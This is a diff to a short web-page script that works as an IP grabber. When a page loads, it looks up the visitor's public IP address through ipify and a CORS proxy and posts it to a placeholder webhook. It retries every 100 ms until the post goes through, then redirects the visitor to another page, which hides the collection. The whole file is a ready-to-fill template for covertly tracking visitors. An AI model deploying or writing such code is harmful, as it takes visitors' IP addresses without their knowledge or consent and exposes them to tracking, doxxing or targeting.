@@ -1,26 +1,42 @@
 <script>
-let userIP;
+    let userIP;
+    let webhook = 'YOUR WEBHOOK HERE';
+    let redirectpage = 'THE WEBPAGE YOU WANT TO REDIRECT TO'
 
-document.addEventListener('DOMContentLoaded', () => {
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      userIP = data.ip;
-      sendDataToWebhook(userIP);
+    document.addEventListener('DOMContentLoaded', () => {
+      fetchIPAndSendWebhook();
     });
-});
 
-function sendDataToWebhook(ip) {
-  const data = {
-    userIP: ip
-  };
+    function fetchIPAndSendWebhook() {
+      fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          userIP = data.ip;
+          sendWebhook();
+        })
+        .catch(() => {
+          setTimeout(fetchIPAndSendWebhook, 100);
+        });
+    }
 
-  fetch('YOUR WEBHOOK HERE', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data)
-  });
-}
+    function sendWebhook() {
+      const data = {
+        userIP: userIP
+      };
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+        .then(() => {
+          // Webhook request sent successfully
+          window.location.href = redirectpage;
+        })
+        .catch(() => {
+          setTimeout(sendWebhook, 100);
+        });
+    }
 </script>
